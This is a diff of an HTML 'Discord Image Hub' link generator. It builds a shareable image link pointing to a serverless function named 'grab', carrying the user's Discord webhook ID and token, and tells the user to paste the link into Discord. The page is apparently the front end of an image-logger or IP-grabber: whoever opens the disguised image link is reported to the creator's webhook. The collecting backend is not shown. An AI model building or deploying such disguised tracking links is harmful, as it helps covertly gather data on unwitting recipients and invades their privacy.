@@ -3,74 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image Link Generator</title>
+    <title>Discord Image Hub</title>
     <style>
         :root { --discord-blurple: #5865F2; --dark-bg: #23272A; }
-        body { font-family: sans-serif; background: var(--dark-bg); color: white; padding: 20px; }
-        .box { max-width: 500px; margin: auto; background: #2C2F33; padding: 25px; border-radius: 10px; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
-        button { width: 100%; padding: 12px; background: var(--discord-blurple); color: white; border: none; cursor: pointer; font-weight: bold; border-radius: 5px; }
-        #outputLink { margin-top: 20px; background: #1e2124; padding: 10px; display: none; word-break: break-all; border-left: 4px solid var(--discord-blurple); }
-        .preview-img { width: 100%; margin-top: 10px; border-radius: 5px; display: none;}
+        body { font-family: 'Segoe UI', sans-serif; background: var(--dark-bg); color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { width: 100%; max-width: 450px; background: #2C2F33; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
+        h2 { text-align: center; margin-bottom: 20px; color: #fff; }
+        label { display: block; margin-bottom: 5px; font-size: 0.9rem; color: #b9bbbe; }
+        input { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 5px; border: none; background: #202225; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background: var(--discord-blurple); color: white; border: none; cursor: pointer; font-weight: bold; border-radius: 5px; transition: 0.2s; }
+        button:hover { background: #4752c4; }
+        #outputLink { margin-top: 25px; background: #1e2124; padding: 15px; display: none; border-radius: 5px; border-left: 5px solid var(--discord-blurple); }
+        code { display: block; word-break: break-all; color: #00b0f4; margin: 10px 0; font-family: monospace; }
+        .copy-hint { font-size: 0.8rem; color: #72767d; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>🔗 Discord Link Generator</h2>
+    <h2>🚀 Link Generator</h2>
     
-    <label>1. Discord Webhook URL</label>
+    <label>Discord Webhook URL</label>
     <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
 
-    <label>2. Image URL</label>
-    <input type="url" id="imgUrl" placeholder="https://site.com/image.png" oninput="updatePreview()">
+    <label>Image URL (Direct Link)</label>
+    <input type="url" id="imgUrl" placeholder="https://i.imgur.com/example.png">
 
-    <button onclick="generateLink()">Generate Discord-Ready Link</button>
+    <button onclick="generateLink()">Generate Embed Link</button>
 
     <div id="outputLink">
-        <p><strong>Generated Link:</strong></p>
+        <span class="copy-hint">Copy and paste this into Discord:</span>
         <code id="finalUrl"></code>
-        <p style="font-size: 0.8em; color: #99aab5;">Copy this link into Discord. The bot will send the message when the page is visited.</p>
     </div>
-
-    <img id="preview" class="preview-img" alt="Preview">
 </div>
 
 <script>
-    function updatePreview() {
-        const imgUrl = document.getElementById('imgUrl').value;
-        const preview = document.getElementById('preview');
-        if(imgUrl) {
-            preview.src = imgUrl;
-            preview.style.display = 'block';
-        }
-    }
-
-    async function generateLink() {
+    function generateLink() {
         const webhook = document.getElementById('webhook').value;
         const img = document.getElementById('imgUrl').value;
         const output = document.getElementById('outputLink');
         const finalUrl = document.getElementById('finalUrl');
 
-        if (!webhook.includes('discord.com/api/webhooks')) {
-            alert("Please enter a valid Discord Webhook URL.");
+        if (!webhook.includes('discord.com/api/webhooks') || !img) {
+            alert("Please provide a valid Webhook and Image URL.");
             return;
         }
 
-        // In a real scenario, these values would be sent to a backend (Node.js/Python)
-        // to generate a unique URL. For this demo, we show the result.
-        finalUrl.innerText = window.location.href + "?img=" + btoa(img);
-        output.style.display = 'block';
+        // Extract ID and Token from the webhook URL
+        const parts = webhook.split('/api/webhooks/')[1];
 
-        // Log to webhook that a link was created (Functional Test)
-        await fetch(webhook, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                content: "🚀 **New Link Generated!**",
-                embeds: [{ title: "Image to be displayed:", image: { url: img } }]
-            })
-        });
+        // This points directly to the Netlify Function
+        const baseUrl = window.location.origin;
+        const generated = `${baseUrl}/.netlify/functions/grab?id=${parts}&img=${encodeURIComponent(img)}`;
+
+        finalUrl.innerText = generated;
+        output.style.display = 'block';
     }
 </script>
 
